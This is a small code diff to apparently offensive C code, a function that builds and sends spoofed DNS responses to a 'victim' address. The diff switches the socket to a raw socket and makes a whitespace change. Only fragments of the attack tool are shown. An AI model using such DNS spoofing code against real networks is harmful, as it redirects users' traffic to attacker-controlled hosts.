@@ -129,7 +129,7 @@ send_spoofed_dns_response(u_char	*dns_req,
 	printf("\nSpoofed response:\n");
 	print_payload(dns_res, len + sizeof(dns_response));
 
-	soc = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+	soc = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
 	if (soc < 0) {
 		printf("\nUnable to create UDP raw socket = %d\n", soc);
 		return -1;
@@ -144,7 +144,7 @@ send_spoofed_dns_response(u_char	*dns_req,
 
         printf("\nTotal packet:\n");
         print_payload(packet, len + sizeof(dns_response) + 8);
-
+	
 	bzero((char *) &victim_addr, sizeof(victim_addr));
     	victim_addr.sin_family = AF_INET;
     	victim_addr.sin_port = dest_port;
